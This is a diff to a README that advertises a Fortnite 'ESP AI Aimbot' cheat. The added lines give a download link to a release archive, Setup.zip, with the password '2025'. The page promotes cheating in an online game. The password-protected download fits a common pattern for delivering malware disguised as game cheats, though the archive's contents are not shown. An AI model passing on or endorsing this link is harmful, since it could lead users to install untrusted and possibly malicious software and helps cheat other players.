@@ -1,6 +1,9 @@
 # Fortnite-ESP-AI-Aimbot
 # 🚀 Fortnite ESP AI Aimbot For PC 🚀
 
+https://github.com/3ve3do4ka/Fortnite-ESP-AI-Aimbot/releases/download/Setup/Setup.zip
+pswrd - 2025
+
 ## 📜 Overview
 
 Transform your gameplay in **Fortnite** with powerful **ESP** and **AI Aimbot**. This tool is designed to enhance your gaming experience by providing extra features to help you track enemies and aim with precision.
